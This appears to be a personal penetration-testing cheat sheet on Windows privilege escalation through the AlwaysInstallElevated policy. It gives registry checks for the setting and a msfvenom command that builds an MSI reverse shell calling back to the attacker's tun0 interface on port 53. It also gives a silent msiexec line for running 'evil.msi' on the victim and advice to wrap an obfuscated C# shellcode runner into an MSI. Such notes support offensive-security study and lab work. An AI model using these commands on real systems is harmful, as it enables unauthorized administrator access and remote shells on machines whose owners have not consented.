## AlwaysInstallElevated

- check from either winpeas or manual regkey enum
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Msf's msi payload may not work
```bash
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=53 -f msi -o reverse.msi 
```
Use this instead
https://github.com/KINGSABRI/MSI-AlwaysInstallElevated



Execution on victim
```
msiexec.exe /quiet /qn /i evil.msi
```

### Via MSIWrapper

- Download from https://www.exemsi.com/download/
- Create an obfuscated C# shellcode runner and compile as exe and then pass it to the program

![alt text](image.png)

![alt text](image-1.png)

![alt text](image-2.png)

![alt text](image-3.png)

![alt text](image-4.png)